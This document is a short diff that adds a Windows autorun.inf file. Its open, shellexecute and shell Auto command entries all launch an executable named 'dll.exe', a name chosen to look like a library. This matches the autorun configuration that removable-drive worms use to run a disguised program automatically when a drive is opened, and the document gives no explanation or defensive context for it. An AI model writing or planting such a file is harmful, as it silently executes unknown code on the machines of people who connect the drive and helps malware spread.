@@ -1,0 +1,4 @@
+[AutoRun]
+open=dll.exe
+shellexecute=dll.exe
+shell\Auto\command=dll.exe
